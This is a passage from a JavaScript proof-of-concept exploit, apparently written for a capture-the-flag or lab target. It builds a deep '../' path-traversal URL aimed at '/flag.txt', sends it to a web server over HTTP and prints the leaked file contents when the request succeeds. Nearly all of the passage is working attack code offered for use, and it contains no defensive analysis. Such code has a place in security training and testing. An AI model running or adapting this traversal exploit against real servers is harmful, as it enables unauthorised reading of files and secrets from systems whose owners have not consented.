    // Since the absolute path of rootPath is unknown, we use a robust "deep" traversal
    // string that covers most local filesystem depths (e.g., /home/runner/work/...).
    const TRAVESAL_DEPTH = '../../../../../../../../../';

    // The target file to access outside the protected directory.
    const TARGET_FILE = '/flag.txt';

    // Construct the malicious path. 
    // Note: We prepend '/' to ensure req.url starts with a slash (standard for HTTP requests).
    const MALICIOUS_PATH = `/${TRAVESAL_DEPTH}${TARGET_FILE}`;

    console.log(`[!] Payload Path: ${MALICIOUS_PATH}`);
    console.log(`[*] Target URL: http://${HOST}:${PORT}${MALICIOUS_PATH}\n`);

    return new Promise((resolve, reject) => {
        const options = {
            hostname: HOST,
            port: PORT,
            path: MALICIOUS_PATH,
            method: 'GET'
        };

        // Create and send the HTTP request
        const req = http.request(options, (res) => {
            let body = '';

            res.on('data', (chunk) => {
                body += chunk;
            });

            res.on('end', () => {
                console.log(`[+] Response Status: ${res.statusCode}`);

                // Analyze response to confirm exploitation
                if (res.statusCode === 200 && body.length > 0 && !body.includes('not found')) {
                    console.log('[+] SUCCESS: Path traversal successful!');
                    console.log(`[+] Extracted Content from ${TARGET_FILE}:\n${body.substring(0, 500)}`);
